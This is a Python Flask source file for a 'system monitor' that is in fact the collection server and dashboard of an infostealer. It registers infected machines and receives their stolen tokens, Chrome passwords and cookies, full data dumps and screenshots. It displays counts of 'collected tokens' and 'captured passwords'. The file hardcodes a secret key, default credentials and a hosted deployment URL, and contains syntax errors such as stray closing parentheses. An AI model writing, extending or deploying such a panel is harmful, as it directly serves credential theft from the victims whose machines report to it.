#!/usr/bin/env python3
"""
LEALDADE SYSTEM MONITOR - RAILWAY VERSION
Site de monitoramento com login seguro e integração com Railway
"""

import os
import sys
import json
import time
from datetime import datetime, timedelta
from flask import Flask, render_template_string, request, jsonify, redirect, url_for, session
from functools import wraps

# Adiciona pasta modules ao path
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'lealdade.gg', 'modules'))

from auth_system import auth_system

app = Flask(__name__)
app.secret_key = 'lealdade_railway_super_secret_key_2024'

# Armazenamento de dados
endpoints_data = {}
endpoint_tokens = {}
endpoint_screenshots = {}
endpoint_full_reports = {}

def require_auth(f):
    """Decorador para exigir autenticação"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not auth_system.is_logged_in():
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# HTML Templates
LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LEALDADE SYSTEM MONITOR</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .login-container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
            text-align: center;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .logo {
            font-size: 2.5rem;
            font-weight: bold;
            background: linear-gradient(45deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 3px;
        }
        
        .subtitle {
            color: #666;
            font-size: 0.9rem;
            margin-bottom: 30px;
            font-style: italic;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 600;
            font-size: 0.9rem;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 1rem;
            transition: all 0.3s ease;
            background: rgba(255, 255, 255, 0.9);
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #667eea;
            background: white;
            box-shadow: 0 0 10px rgba(102, 126, 234, 0.1);
        }
        
        .login-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-top: 10px;
        }
        
        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.2);
        }
        
        .login-btn:active {
            transform: translateY(0);
        }
        
        .footer {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            color: #666;
            font-size: 0.8rem;
        }
        
        .footer-text {
            font-style: italic;
            margin-bottom: 10px;
        }
        
        .warning {
            background: rgba(255, 193, 7, 0.1);
            border: 1px solid rgba(255, 193, 7, 0.3);
            color: #d9534f;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">LEALDADE</div>
        <div class="subtitle">System Monitor</div>
        
        {% if error %}
        <div class="warning">
            <strong>⚠️ Atenção:</strong> {{ error }}
        </div>
        {% endif %}
        
        <form method="POST" action="/login">
            <div class="form-group">
                <label for="username">👤 Usuário</label>
                <input type="text" id="username" name="username" required placeholder="Digite seu usuário">
            </div>
            
            <div class="form-group">
                <label for="password">🔑 Senha</label>
                <input type="password" id="password" name="password" required placeholder="Digite sua senha">
            </div>
            
            <button type="submit" class="login-btn">🚀 Acessar Sistema</button>
        </form>
        
        <div class="footer">
            <div class="footer-text">"Se você chegou até aqui, tem um longo caminho a seguir"</div>
            <div style="font-size: 0.7rem; color: #999;">
                Sistema de Monitoramento Seguro v1.0<br>
                © 2024 LEALDADE System Monitor
            </div>
        </div>
    </div>
</body>
</html>
"""

DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LEALDADE SYSTEM MONITOR - Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #1a1a1a;
            color: #ffffff;
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        
        .header-content {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo {
            font-size: 1.8rem;
            font-weight: bold;
            background: linear-gradient(45deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .user-info {
            text-align: right;
            color: rgba(255, 255, 255, 0.9);
        }
        
        .user-info span {
            display: block;
            margin-bottom: 5px;
            font-size: 0.9rem;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: #2d2d2d;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            transition: all 0.3s ease;
            border: 1px solid #444;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.2);
            border-color: #667eea;
        }
        
        .stat-card h3 {
            color: #667eea;
            margin-bottom: 15px;
            font-size: 1.3rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .stat-card .number {
            font-size: 2.5rem;
            font-weight: bold;
            color: #ffffff;
        }
        
        .stat-card .label {
            color: #999;
            font-size: 0.9rem;
            margin-bottom: 10px;
        }
        
        .endpoints-section {
            background: #2d2d2d;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            margin-bottom: 30px;
        }
        
        .endpoints-section h2 {
            color: #667eea;
            margin-bottom: 20px;
            font-size: 1.5rem;
            text-align: center;
        }
        
        .endpoint-list {
            display: grid;
            gap: 15px;
        }
        
        .endpoint-item {
            background: #1e1e1e;
            border-radius: 10px;
            padding: 20px;
            border: 1px solid #444;
            transition: all 0.3s ease;
        }
        
        .endpoint-item:hover {
            background: #2a2a2a;
            border-color: #667eea;
        }
        
        .endpoint-name {
            font-size: 1.1rem;
            font-weight: 600;
            color: #ffffff;
            margin-bottom: 10px;
        }
        
        .endpoint-stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
            margin-bottom: 10px;
        }
        
        .stat {
            text-align: center;
            padding: 10px;
            background: #1a1a1a;
            border-radius: 5px;
            border: 1px solid #444;
        }
        
        .stat-value {
            font-size: 1.2rem;
            font-weight: bold;
            color: #667eea;
            display: block;
            margin-bottom: 5px;
        }
        
        .stat-label {
            font-size: 0.8rem;
            color: #999;
        }
        
        .logout-btn {
            background: #dc3545;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 0.9rem;
            transition: all 0.3s ease;
        }
        
        .logout-btn:hover {
            background: #c82333;
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            border-top: 1px solid #444;
            color: #666;
            font-size: 0.8rem;
        }
        
        .refresh-btn {
            background: #28a745;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 0.9rem;
            transition: all 0.3s ease;
        }
        
        .refresh-btn:hover {
            background: #218838;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <div class="logo">LEALDADE</div>
            <div class="user-info">
                <span>👤 {{ session.user.username }}</span>
                <span>⏰ {{ session.session_duration }} min</span>
                <span>🌐 {{ session.ip }}</span>
                <a href="/logout" class="logout-btn">🚪 Sair</a>
            </div>
        </div>
    </div>
    
    <div class="container">
        <div class="stats-grid">
            <div class="stat-card">
                <h3>
                    <span class="number">{{ total_endpoints }}</span>
                    🖥️
                </h3>
                <div class="label">Endpoints Ativos</div>
            </div>
            
            <div class="stat-card">
                <h3>
                    <span class="number">{{ total_tokens }}</span>
                    🔑
                </h3>
                <div class="label">Tokens Coletados</div>
            </div>
            
            <div class="stat-card">
                <h3>
                    <span class="number">{{ total_passwords }}</span>
                    🔐
                </h3>
                <div class="label">Senhas Capturadas</div>
            </div>
            
            <div class="stat-card">
                <h3>
                    <span class="number">{{ total_screenshots }}</span>
                    📸
                </h3>
                <div class="label">Screenshots</div>
            </div>
        </div>
        
        <div class="endpoints-section">
            <h2>📊 Endpoints Monitorados</h2>
            <button class="refresh-btn" onclick="location.reload()">🔄 Atualizar</button>
            
            <div class="endpoint-list">
                {% for endpoint in endpoints %}
                <div class="endpoint-item">
                    <div class="endpoint-name">{{ endpoint.id }}</div>
                    <div class="endpoint-stats">
                        <div class="stat">
                            <span class="stat-value">{{ endpoint.tokens|length }}</span>
                            <div class="stat-label">Tokens</div>
                        </div>
                        <div class="stat">
                            <span class="stat-value">{{ endpoint.passwords|length }}</span>
                            <div class="stat-label">Senhas</div>
                        </div>
                        <div class="stat">
                            <span class="stat-value">{{ endpoint.cookies|length }}</span>
                            <div class="stat-label">Cookies</div>
                        </div>
                        <div class="stat">
                            <span class="stat-value">{{ 'Sim' if endpoint.screenshot else 'Não' }}</span>
                            <div class="stat-label">Screenshot</div>
                        </div>
                    </div>
                </div>
                {% endfor %}
            </div>
        </div>
    </div>
    
    <div class="footer">
        <div>"Se você chegou até aqui, tem um longo caminho a seguir"</div>
        <div style="font-size: 0.7rem; color: #666;">
            Sistema de Monitoramento Seguro v1.0<br>
            © 2024 LEALDADE System Monitor
        </div>
    </div>
    
    <script>
        // Auto-refresh a cada 30 segundos
        setTimeout(() => {
            location.reload();
        }, 30000);
    </script>
</body>
</html>
"""

# Armazenamento em arquivo para persistência
DATA_FILE = r"C:\temp\lealdade_monitor_data.json"

def load_data():
    """Carrega dados do arquivo"""
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    
    return {
        'endpoints_data': {},
        'endpoint_tokens': {},
        'endpoint_screenshots': {},
        'endpoint_full_reports': {}
    }

def save_data():
    """Salva dados no arquivo"""
    try:
        os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
        with open(DATA_FILE, 'w') as f:
            json.dump({
                'endpoints_data': endpoints_data,
                'endpoint_tokens': endpoint_tokens,
                'endpoint_screenshots': endpoint_screenshots,
                'endpoint_full_reports': endpoint_full_reports
            }, f, indent=2)
    except Exception as e:
        print(f"[DATA] Erro ao salvar dados: {e}")

def require_auth(f):
    """Decorador para exigir autenticação"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not auth_system.is_logged_in():
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
def index():
    """Página principal - redireciona para login ou dashboard"""
    if auth_system.is_logged_in():
        return redirect(url_for('dashboard'))
    return render_template_string(LOGIN_TEMPLATE, error=None)

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Página de login"""
    if request.method == 'GET':
        return render_template_string(LOGIN_TEMPLATE)
    
    username = request.form.get('username')
    password = request.form.get('password')
    
    if username and password:
        success, message = auth_system.login(username, password)
        
        if success:
            session['user'] = auth_system.get_session_info()
            return redirect(url_for('dashboard'))
        else:
            return render_template_string(LOGIN_TEMPLATE, error=message)
    
    return render_template_string(LOGIN_TEMPLATE, error="Credenciais inválidas")

@app.route('/logout')
def logout():
    """Logout do sistema"""
    auth_system.logout()
    session.clear()
    return redirect(url_for('login'))

@app.route('/dashboard')
@require_auth
def dashboard():
    """Dashboard principal"""
    session_info = session.get('user', {})
    
    # Calcula estatísticas
    total_endpoints = len(endpoints_data)
    total_tokens = sum(len(endpoint_tokens.get(ep, [])) for ep in endpoint_tokens)
    total_passwords = sum(len(endpoint_full_reports.get(ep, {}).get('browser_data', {}).get('Chrome', {}).get('data', [])) for ep in endpoint_full_reports)
    total_screenshots = len(endpoint_screenshots)
    
    # Prepara lista de endpoints com estatísticas
    endpoints = []
    for ep_id in endpoints_data.keys():
        ep_data = endpoints_data[ep_id]
        endpoints.append({
            'id': ep_id,
            'tokens': endpoint_tokens.get(ep_id, []),
            'passwords': endpoint_full_reports.get(ep_id, {}).get('browser_data', {}).get('Chrome', {}).get('data', [])),
            'cookies': endpoint_full_reports.get(ep_id, {}).get('browser_data', {}).get('Chrome', {}).get('cookies', [])),
            'screenshot': ep_id in endpoint_screenshots
        })
    
    return render_template_string(DASHBOARD_TEMPLATE, 
                             session=session_info,
                             total_endpoints=total_endpoints,
                             total_tokens=total_tokens,
                             total_passwords=total_passwords,
                             total_screenshots=total_screenshots,
                             endpoints=endpoints)

# API Endpoints
@app.route('/api/register', methods=['POST'])
def register_endpoint():
    """Registra novo endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id')
        
        if endpoint_id:
            endpoints_data[endpoint_id] = {
                'id': endpoint_id,
                'status': 'online',
                'last_seen': datetime.now().isoformat(),
                'system_info': data.get('system_info', {}),
                'registered_at': datetime.now().isoformat()
            }
            save_data()
            print(f"[API] Endpoint registrado: {endpoint_id}")
            return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao registrar endpoint: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tokens', methods=['POST'])
def receive_tokens():
    """Recebe tokens de um endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id')
        tokens = data.get('tokens', [])
        
        if endpoint_id:
            endpoint_tokens[endpoint_id] = tokens
            save_data()
            print(f"[API] Tokens recebidos: {endpoint_id} - {len(tokens)} tokens")
            return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber tokens: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/full_report', methods=['POST'])
def receive_full_report():
    """Recebe relatório completo"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id')
        dump_data = data.get('dump_data')
        
        if endpoint_id:
            endpoint_full_reports[endpoint_id] = dump_data
            save_data()
            print(f"[API] Relatório completo recebido: {endpoint_id}")
            return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber relatório: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/screenshot', methods=['POST'])
def receive_screenshot():
    """Recebe screenshot"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id')
        screenshot_data = data.get('screenshot')
        
        if endpoint_id and screenshot_data:
            endpoint_screenshots[endpoint_id] = screenshot_data
            save_data()
            print(f"[API] Screenshot recebido: {endpoint_id}")
            return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber screenshot: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/endpoints')
def list_endpoints():
    """Lista todos os endpoints"""
    try:
        endpoints = []
        for ep_id, data in endpoints_data.items():
            endpoints.append({
                'id': ep_id,
                'status': data.get('status', 'unknown'),
                'last_seen': data.get('last_seen', ''),
                'system_info': data.get('system_info', {}),
                'tokens_count': len(endpoint_tokens.get(ep_id, [])),
                'registered_at': data.get('registered_at', '')
            })
        
        return jsonify(endpoints)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/endpoint_data/<endpoint_id>')
def get_endpoint_data(endpoint_id):
    """Retorna dados completos de um endpoint"""
    try:
        data = {
            'tokens': endpoint_tokens.get(endpoint_id, []),
            'full_report': endpoint_full_reports.get(endpoint_id, {}),
            'screenshot': endpoint_screenshots.get(endpoint_id, None)
        }
        return jsonify(data)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Carrega dados ao iniciar
data = load_data()
endpoints_data = data['endpoints_data']
endpoint_tokens = data['endpoint_tokens']
endpoint_screenshots = data['endpoint_screenshots']
endpoint_full_reports = data['endpoint_full_reports']

if __name__ == '__main__':
    print("=" * 60)
    print("LEALDADE SYSTEM MONITOR - RAILWAY VERSION")
    print("=" * 60)
    print("🚀 Iniciando servidor de monitoramento...")
    print("🌐 Acesse: https://web-production-49d37.up.railway.app")
    print("👤 Login: lealdade / lealdade")
    print("=" * 60)
    
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
